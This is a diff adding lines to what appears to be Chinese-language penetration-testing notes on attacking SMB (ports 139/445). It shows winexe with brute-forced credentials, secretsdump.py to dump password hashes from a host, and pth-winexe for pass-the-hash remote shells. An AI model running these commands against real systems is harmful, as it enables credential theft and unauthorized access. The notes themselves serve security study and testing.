@@ -124,3 +124,10 @@ CIFS / SMB - TCP 139,445
 
     利用爆破拿到的帳密執行winexe winexe –U 'Username%Password' //<IP> cmd.exe
 <img alt="image" src="https://github.com/user-attachments/assets/3fb9e8d6-69ae-400a-b713-0754621ee0e6">
+
+    secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.21 取得密碼HASH
+<img width="506" alt="image" src="https://github.com/user-attachments/assets/75476e40-c987-4da6-b6ff-a87a1f2e7ee1">
+
+    執行pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
+<img  alt="image" src="https://github.com/user-attachments/assets/ea5804da-21b6-495e-aec5-2bc6f6b79c97">
+
